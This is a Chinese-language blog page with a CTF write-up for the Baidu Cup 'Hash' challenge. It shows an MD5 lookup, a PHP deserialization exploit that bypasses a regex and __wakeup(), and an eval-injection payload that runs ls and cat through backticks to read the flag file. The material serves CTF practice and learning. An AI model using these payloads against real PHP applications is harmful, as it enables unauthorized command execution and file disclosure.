@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="gelinlang">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="“百度杯”CTF比赛-十月场-Hash">
+  <meta property="og:description" content="路漫漫求修远兮，我将上下而求索">
+  <meta property="og:site_name" content="gelinlang&#39;s Blog">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://gelinlang.cn">
+  
+    <link rel="alternate" href="/atom.xml" title="gelinlang&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>gelinlang's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">“百度杯”CTF比赛-十月场-Hash</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/">
+                  
+                  tags
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/">
+                  
+                  categories
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/gelinlang@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By gelinlang</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-04-23</span>
+            <span class="time">22:04:13</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/CTF/">CTF</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>累~这道题查了好多资料，先总结一下：解hash，反序列化，绕过正则，eval的熟练运用。</p>
+<p>打开页面有个链接hahaha，点进去，显示you are 123;if you are not 123,you can get the flag，审查元素，得到提示。<br><img src="https://upload-images.jianshu.io/upload_images/16514845-01ed1e8b1ea1f22a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>意思是，当key!=123和它对应hash传回去，就能得到flag，也就是需要知道sign是多少。<br>题给了一组key=3，hash=f9109d5f83921a551cf859f853afe7bb，对hash找个网站解密,解密结果为kkkkkk01123，也就是sign=kkkkkk01。然后随便填个key=111，将kkkkkk01111对应的hash传回去。<br> <a id="more"></a><br>得到页面返回next step is Gu3ss_m3_h2h2.php。访问看到源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private $file = &apos;Gu3ss_m3_h2h2.php&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo @highlight_file($this-&gt;file, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        if ($this-&gt;file != &apos;Gu3ss_m3_h2h2.php&apos;) &#123;</span><br><span class="line">            //the secret is in the f15g_1s_here.php</span><br><span class="line">            $this-&gt;file = &apos;Gu3ss_m3_h2h2.php&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;var&apos;])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[&apos;var&apos;]);</span><br><span class="line">    if (preg_match(&apos;/[oc]:\d+:/i&apos;, $var)) &#123;</span><br><span class="line">        die(&apos;stop hacking!&apos;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(&quot;Gu3ss_m3_h2h2.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>大意是用get方式传递var参数，先对它base64解码，接着正则匹配，然后对其反序列化。在反序列化时，wakeup这个函数使得我们传进去的文件名f15g_1s_here.php变成Gu3ss_m3_h2h2.php了，想要读取f15g_1s_here.php，需要绕过它。(具体见之前写的一篇反序列化中__wakeup()函数漏洞)<br>对于用’+’绕过正则，参考了这篇文章，链接<a href="https://xz.aliyun.com/t/2733。" target="_blank" rel="noopener">https://xz.aliyun.com/t/2733。</a></p>
+<p>接下来开始操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private $file = &apos;Gu3ss_m3_h2h2.php&apos;;</span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo @highlight_file($this-&gt;file, true);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        if ($this-&gt;file != &apos;Gu3ss_m3_h2h2.php&apos;) &#123;</span><br><span class="line">            //the secret is in the f15g_1s_here.php</span><br><span class="line">            $this-&gt;file = &apos;Gu3ss_m3_h2h2.php&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Demo(&apos;f15g_1s_here.php&apos;);</span><br><span class="line">$s = serialize($a);</span><br><span class="line">echo $s;</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">$s = str_replace(&apos;O:4&apos;, &apos;O:+4&apos;,$s);//绕过正则</span><br><span class="line">$s = str_replace(&apos;:1:&apos;, &apos;:2:&apos; ,$s);//绕过wakeup函数</span><br><span class="line">echo base64_encode($s);//最后base64编码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</span><br></pre></td></tr></table></figure></p>
+<p>Gu3ss_m3_h2h2.php?var=上面的结果将其传回，然后返回了f15g_1s_here.php的源码。如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_GET[&apos;val&apos;])) &#123;</span><br><span class="line">    $val = $_GET[&apos;val&apos;];</span><br><span class="line">    eval(&apos;$value=&quot;&apos; . addslashes($val) . &apos;&quot;;&apos;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&apos;hahaha!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是利用 上面的eval()函数来找到flag，它将传进去的参数转义处理，然后执行，这里val是可控的，所以构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f15g_1s_here.php?val=$&#123;eval(&quot;echo &apos;ls&apos; ;&quot;)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是addslashes对单引号，双引号，反斜杠进行了转义，所以只能用反引号(`)。而且反斜杠被转义了，使用不了引号嵌套。所以想到再利用一次get请求。payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f15g_1s_here.php?val=$&#123;eval($_GET[a])&#125;&amp;a=echo `ls`;//注意最后的分号。</span><br></pre></td></tr></table></figure></p>
+<p>得到True_F1ag_i3_Here_233.php<br><img src="https://upload-images.jianshu.io/upload_images/16514845-3c654490eb962495.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>修改payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f15g_1s_here.php?val=$&#123;eval($_GET[a])&#125;&amp;a=echo `cat True_F1ag_i3_Here_233.php`;</span><br></pre></td></tr></table></figure></p>
+<p>审查元素得到flag<br><img src="https://upload-images.jianshu.io/upload_images/16514845-434a51362eb6e826.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
